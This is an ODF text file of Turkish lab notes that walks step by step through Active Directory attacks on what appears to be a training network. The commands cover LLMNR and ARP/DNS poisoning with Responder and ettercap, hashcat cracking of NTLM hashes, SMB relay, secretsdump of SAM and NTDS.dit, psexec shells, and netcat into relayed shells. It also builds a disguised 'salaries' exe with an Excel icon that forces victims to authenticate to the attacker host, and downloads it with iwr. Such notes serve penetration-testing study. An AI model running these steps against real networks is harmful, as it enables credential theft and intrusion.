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c490a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1f4b11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1c490a" officeooo:paragraph-rsid="00201826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1c490a" officeooo:paragraph-rsid="0024f1ad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1a4133" officeooo:paragraph-rsid="001f4b11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1f4b11" officeooo:paragraph-rsid="001f4b11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1f4b11" officeooo:paragraph-rsid="0020ce72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201826" officeooo:paragraph-rsid="00201826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20ce72" officeooo:paragraph-rsid="0020ce72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.5pt" fo:font-weight="normal" officeooo:rsid="0023bda4" officeooo:paragraph-rsid="0023bda4" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0023bda4" officeooo:paragraph-rsid="0024f1ad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fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0024f1ad" officeooo:paragraph-rsid="0024f1ad" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00263f22" officeooo:paragraph-rsid="00263f22" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002957eb" officeooo:paragraph-rsid="002957eb" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002b329d" officeooo:paragraph-rsid="002b329d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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002c88ea" officeooo:paragraph-rsid="002c88ea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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002da69e" officeooo:paragraph-rsid="002da69e" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002e1305" officeooo:paragraph-rsid="002e1305" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#127622" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001c490a" officeooo:paragraph-rsid="001c490a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color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001f4b11" officeooo:paragraph-rsid="001f4b11" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00221b59" officeooo:paragraph-rsid="00221b59" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0023bda4" officeooo:paragraph-rsid="0023bda4" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0023bda4" officeooo:paragraph-rsid="0024f1ad" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0024f1ad" officeooo:paragraph-rsid="0024f1ad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fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00262165" officeooo:paragraph-rsid="00262165" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="002957eb" officeooo:paragraph-rsid="002957eb" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="002957eb" officeooo:paragraph-rsid="002c88ea" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="002da69e" officeooo:paragraph-rsid="002da69e" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002f2fec" officeooo:paragraph-rsid="002f2fec" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="002feed5" officeooo:paragraph-rsid="002feed5" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001f4b11"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00201826"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="0020ce72"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="002435a4"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="0024f1ad"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="002c88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1.<text:span text:style-name="T1">ACTİVE DİRECTORY VE DOMAİN ATTACK VEKTÖRLERİ</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P21">LLMNR/NBT-PS Poisoning ve NTLMv2 Capture</text:p>
      <text:p text:style-name="P7">Wiresharkımız eth0 açık.</text:p>
      <text:p text:style-name="P7">BILGIISLEM den run, \\YAZILIM-PC yazıp networkte girdik.</text:p>
      <text:p text:style-name="P7">\\YAZILIM-PC3 directory arattık (hataylaymış gibi).</text:p>
      <text:p text:style-name="P7">responder -I eth0 -dwv</text:p>
      <text:p text:style-name="P7">yine BILGIISLEMde arattık.</text:p>
      <text:p text:style-name="P7">NTLMv2 Hashleri elimizde..</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P21">SMB İletişimini Kesme ve NTVLv2 Capture</text:p>
      <text:p text:style-name="P3">nano /etc/ettercap/etter.dns <text:s/><text:span text:style-name="T2">(ettercap dns ayarlarımızı değişitiricez.)</text:span></text:p>
      <text:p text:style-name="P9">(YAZILIM-PC sorulduğunda bize yönlendirilmesini sağlayacağız.)</text:p>
      <text:p text:style-name="P2">YAZILIM-PC.sirket.local <text:s text:c="8"/>A <text:s text:c="6"/>10.10.10.80</text:p>
      <text:p text:style-name="P2">YAZILIM-PC <text:s text:c="21"/>A <text:s text:c="6"/>10.10.10.80</text:p>
      <text:p text:style-name="P9">bunları sonuna ekledik.</text:p>
      <text:p text:style-name="P9">echo 0 &gt; /proc/sys/net/ipv4/ip_forward <text:s/><text:span text:style-name="T3">(kapadık.)</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">ettercap e girdik, hostları tarattık.</text:p>
      <text:p text:style-name="P10">Plugins &gt; dns-spoof</text:p>
      <text:p text:style-name="P10">25 I TARGET 1</text:p>
      <text:p text:style-name="P10">20 ve 254 ü TARGET 2 yapıyoruz. (çünkü 25 e ulaşılamadığında 254 e gidecek.)</text:p>
      <text:p text:style-name="P10">ARP Poisoning..</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">hedeften arp -a ile kontrol edebiliriz.</text:p>
      <text:p text:style-name="P8">responder -I eth0 -dwv</text:p>
      <text:p text:style-name="P10">BILGIISLEM de run ile <text:span text:style-name="T1">\\YAZILIM-PC </text:span>girmeye çalışıyoruz.</text:p>
      <text:p text:style-name="P10">BAŞARISIZ..</text:p>
      <text:p text:style-name="P10">İsmi değiştirerek yeniden girmek denendiğinde <text:s/>(<text:span text:style-name="T1">\\YAZILIMPC</text:span>) gibi</text:p>
      <text:p text:style-name="P10">HASH ler elimizde..</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">nanocan etter.dnsde bu sefer de BILGIISLEM e erişmek isteyenleri zehirleyeceğiz</text:p>
      <text:p text:style-name="P10">BILGIISLEM-PC <text:s text:c="18"/>A <text:s text:c="6"/>10.10.10.80</text:p>
      <text:p text:style-name="P10">BILGIISLEM-PC.sirket.local <text:s text:c="5"/>A <text:s text:c="6"/>10.10.10.80</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">bu sefer 25 ve 35 TARGET1</text:p>
      <text:p text:style-name="P10">20 ve 254 TARGET2</text:p>
      <text:p text:style-name="P10">dns spoofin pluginini açıp ARP Poisoning e başlıyoruz.</text:p>
      <text:p text:style-name="P10">YAZILIM-PC den run a \\BILGIISLEM-PC yazıp girmeye çalışıyoruz.</text:p>
      <text:p text:style-name="P10">Aynı olayın tersi..</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P22">NTLMv2 HASH Cracking</text:p>
      <text:p text:style-name="P11">Aldığımız hashleri hashcat yardımıyla NTLMv2 hashini kıracak kodu bulduk (5600)</text:p>
      <text:p text:style-name="P11">Hashleri Desktop a txt attık.</text:p>
      <text:p text:style-name="P11">hashcat -m 5600 -a 0 ~/Desktop/ntlmv2-hashes.txt /usr/share/wordlists/rockyou.txt --status –force</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P23">SMBv2 Signing Kullanım Tespiti</text:p>
      <text:p text:style-name="P2">nmap --script smb2-security-mode 10.10.10.0/24 -p 445</text:p>
      <text:p text:style-name="P11">Massage signinge, hepsinde enabled ama sadece Domain de required..</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P23"><text:soft-page-break/>SMB Relay Saldırısı ve NTLM Hash Capture</text:p>
      <text:p text:style-name="P12">Responder içindeki SMB ve HTTP server kapatıyoruz.</text:p>
      <text:p text:style-name="P4">nano /etc/responder/Responder.conf</text:p>
      <text:p text:style-name="P12">responder -I eth0 -dwv</text:p>
      <text:p text:style-name="P2">/<text:span text:style-name="T4">opt/impacket içerisine gidip HTTP ve SMB server çalıştıracağız.</text:span></text:p>
      <text:p text:style-name="P2">ntlmrelayx.py -tf /root/Desktop/targets.txt -smb2support</text:p>
      <text:p text:style-name="P13">Hedefte hatalı erişim denemesi sonucunda Hashleri aldık..</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P24">NTLM <text:span text:style-name="T5">HASH Cracking</text:span></text:p>
      <text:p text:style-name="P2">hashcat -m 1000 -a 0 /root/Desktop/sam-hashes.txt /usr/share/wordlists/rockyou.txt --status --force</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P25">Tüm Ağda ve Uzaktan HASH Dump</text:p>
      <text:p text:style-name="P13">msfconsole <text:s/>secretsdump</text:p>
      <text:p text:style-name="P13">set rhosts 10.10.10.0/24</text:p>
      <text:p text:style-name="P13">set smbuser master</text:p>
      <text:p text:style-name="P13">set smbpass <text:a xlink:type="simple" xlink:href="mailto:P@ssw0rd" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">P@ssw0rd</text:a>!1</text:p>
      <text:p text:style-name="P13">set threads 5</text:p>
      <text:p text:style-name="P13">çalıştırınca master kullanıcısı olanlara girmeye calışacağız ama error verecek.</text:p>
      <text:p text:style-name="P13">Bu ayarlamaları M3-Windows Server 2008 için yaparsak çalışıyor.</text:p>
      <text:p text:style-name="P13">Şimdi BILGIISLEM için ayarlayalım.</text:p>
      <text:p text:style-name="P13">set smbuser a.bilgi</text:p>
      <text:p text:style-name="P13">set smbpass %Password1</text:p>
      <text:p text:style-name="P13">set smbdomain sirket.local</text:p>
      <text:p text:style-name="P13">SAM HASH ve NTDS.DIT aldık..</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P25">Önbelleklenmiş (CDLC) Şifre HASHlerini Elde Etme</text:p>
      <text:p text:style-name="P13">secretsdump.py 'sirket.local/f.yoneten:<text:a xlink:type="simple" xlink:href="mailto:Password!!@10.10.10.35" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Password!!@10.10.10.35</text:a>' </text:p>
      <text:p text:style-name="P13">(20ve25 deneyince rpc_s_access denied!)</text:p>
      <text:p text:style-name="P13">Daha önce o bilgisayarda oturum açmış bütün bilgiler alınır.</text:p>
      <text:p text:style-name="P13">Domain logon info alıyoruz.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P26">Cached Domain Logon HASHlerinin Kırılması</text:p>
      <text:p text:style-name="P14">Öncelikle dosyadaki $ dan önceki gereksiz kısımları silelim.</text:p>
      <text:p text:style-name="P14">hashcat -m 2100 -a 0 /root/Desktop/cdlc-hashes.txt /usr/share/wordlists/rockyou.txt --status --force</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P27">Psexec ile Shell Alımı – Defender vs TrendMicro</text:p>
      <text:p text:style-name="P15">msfconsole <text:s/>windows/smb/psexec</text:p>
      <text:p text:style-name="P15">ayarları yapıp 10.10.10.35 ve 25 e a.bilgi domainden saldırdık.</text:p>
      <text:p text:style-name="P15">Antivirüse takıldık.</text:p>
      <text:p text:style-name="P15">10.10.10.20 ye deneyelim. <text:s/>Yine antivirüs..</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">psexec.py 'sirket.local/a.bilgi:<text:a xlink:type="simple" xlink:href="mailto:%25Password1@10.10.10.35" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">%Password1@10.10.10.35</text:a>'</text:p>
      <text:p text:style-name="P15">35 ve 25 için antivirüs engeller ama 20 de shell gireriz.</text:p>
      <text:p text:style-name="P15">(Normalde olur ama bu sistemde olmuyor)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:soft-page-break/>Fake SMB Server Saldırısı </text:p>
      <text:p text:style-name="P16">msfconsole <text:s text:c="2"/>search "capture smb" <text:s text:c="2"/><text:span text:style-name="T6">use 0</text:span></text:p>
      <text:p text:style-name="P17">arka planda NTLMv1 ve NTLMv2 için dinliyor..</text:p>
      <text:p text:style-name="P17">BILGIISLEM-PC ve YAZILIM-PC yi \\10.10.10.80 <text:s/>üzerimize gönderdik.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P29">KAHVE MOLASI</text:p>
      <text:p text:style-name="P19">Hedefteki Ortak alana göndereceğimiz sahte bir exe ile kendimize html üzerinden yönlendireceğiz ve User HASH leri alacağız.</text:p>
      <text:p text:style-name="P19">Msfconsole <text:s/>server/capture/smb</text:p>
      <text:p text:style-name="P19">set johnpwfile desktop/hash.txt</text:p>
      <text:p text:style-name="P19">bat to exe converter kullanacağız (B2E)</text:p>
      <text:p text:style-name="P19">kod kısmına </text:p>
      <text:p text:style-name="P19">net use \\10.10.10.80</text:p>
      <text:p text:style-name="P19">icon kısmına excel png si bulup .ico ya çevirip ekliyoruz.</text:p>
      <text:p text:style-name="P19">Exe-format = 64 Bit | Windows (Invisible)</text:p>
      <text:p text:style-name="P19">guncel_maaslar adında sahte dosyalar oluşturacağız.</text:p>
      <text:p text:style-name="P19">Önce bat, sonra exe dosyamız hazır. <text:s/>(converter)</text:p>
      <text:p text:style-name="P19">service apache2 start ..</text:p>
      <text:p text:style-name="P19">/var/www/html <text:s/>altına exe yi atıyoruz.</text:p>
      <text:p text:style-name="P19"><text:a xlink:type="simple" xlink:href="http://10.10.10.80/guncel_maaslar.exe" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.10.80/guncel_maaslar.exe</text:a> <text:s/>çalıştığı takdirde exe yüklenmiş olacak.</text:p>
      <text:p text:style-name="P19">Psexec.py ‘sirket.local/a.bilgi:<text:a xlink:type="simple" xlink:href="mailto:%25Password1@10.10.10.20" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">%Password1@10.10.10.20</text:a>’</text:p>
      <text:p text:style-name="P19">ortak alana gidip powershell e giriyoruz.</text:p>
      <text:p text:style-name="P19">iwr -outf guncel_maaslar.exe <text:a xlink:type="simple" xlink:href="http://10.10.10.80/guncel_maaslar.exe" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.10.80/guncel_maaslar.exe</text:a></text:p>
      <text:p text:style-name="P19">çalıştığı takdirde msfconsole da capture/smb den hashleri alacağız..</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P28">SMB <text:span text:style-name="T6">Relay ile NC Shell Alımı</text:span></text:p>
      <text:p text:style-name="P2">responder -I eth0 -dwv</text:p>
      <text:p text:style-name="P2">ntlmrelayx.py -tf /root/Desktop/targets.txt -smb2support -i</text:p>
      <text:p text:style-name="P30">a.bilgi hata yapar.</text:p>
      <text:p text:style-name="P31">SMB Client SHELL için ip ve port aldık. Netcat ile gireceğiz.</text:p>
      <text:p text:style-name="P31">Nc 127.0.0.1 11000 <text:s/>(20 ye girdik)</text:p>
      <text:p text:style-name="P31">nc 127.0.0.1 11001 <text:s/>(25 e girdik) <text:s/>(doğru)</text:p>
      <text:p text:style-name="P18">Shell aldık</text:p>
      <text:p text:style-name="P31">get sifreler.txt</text:p>
      <text:p text:style-name="P31">put sifreler.exe</text:p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9T13:28:07.457730547</dc:date>
    <meta:editing-duration>PT3H40M25S</meta:editing-duration>
    <meta:editing-cycles>20</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="111" meta:word-count="588" meta:character-count="4697" meta:non-whitespace-character-count="4128"/>
  </office:meta>
</office:document-meta>
</file>